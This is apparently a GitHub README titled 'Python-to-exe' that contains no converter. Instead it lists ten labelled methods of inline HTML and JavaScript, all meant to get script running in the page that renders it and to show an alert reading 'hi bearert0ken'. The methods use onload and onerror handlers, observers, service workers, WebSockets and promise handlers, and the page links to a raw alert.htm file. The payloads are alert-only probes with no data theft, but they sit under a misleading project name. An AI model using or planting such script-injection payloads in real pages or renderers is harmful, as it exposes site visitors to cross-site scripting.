# Python-to-exe

## Try these methods:

[Raw HTML File](https://raw.githubusercontent.com/bearertoken1/Python-to-exe/main/alert.htm)

[GitHub Raw Content](https://github.com/bearertoken1/Python-to-exe/raw/main/alert.htm)

## Alternative attempts on this page:

<!-- Method A: Canvas with script execution context -->
<canvas id="c" onload="alert('hi bearert0ken')"></canvas>
<script>document.getElementById('c').onload()</script>

<!-- Method B: Mutation observer -->
<div id="test">Test</div>
<script>
var observer = new MutationObserver(function(mutations) { alert('hi bearert0ken'); });
observer.observe(document.getElementById('test'), {childList: true});
document.getElementById('test').innerHTML = 'Changed';
</script>

<!-- Method C: RequestAnimationFrame -->
<script>
requestAnimationFrame(function() { alert('hi bearert0ken'); });
</script>

<!-- Method D: Intersection Observer -->
<div id="trigger"></div>
<script>
new IntersectionObserver(function() { alert('hi bearert0ken'); }).observe(document.getElementById('trigger'));
</script>

<!-- Method E: Service Worker (if allowed) -->
<script>
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('sw.js').then(function() { alert('hi bearert0ken'); });
}
</script>

<!-- Method F: Local Storage + Check -->
<script>
try {
  localStorage.setItem('alert', 'hi bearert0ken');
  alert(localStorage.getItem('alert'));
} catch(e) {}
</script>

<!-- Method G: WebSocket attempt -->
<script>
try {
  new WebSocket('ws://localhost').onerror = function() { alert('hi bearert0ken'); };
} catch(e) { alert('hi bearert0ken'); }
</script>

<!-- Method H: Image beacon with fetch fallback -->
<img src="x" onerror="fetch('https://example.com').catch(e => alert('hi bearert0ken'))">

<!-- Method I: Promise rejection handler -->
<script>
Promise.reject().catch(() => alert('hi bearert0ken'));
</script>

<!-- Method J: Async/await with error -->
<script>
(async function() {
  try {
    await Promise.reject();
  } catch(e) {
    alert('hi bearert0ken');
  }
})();
</script>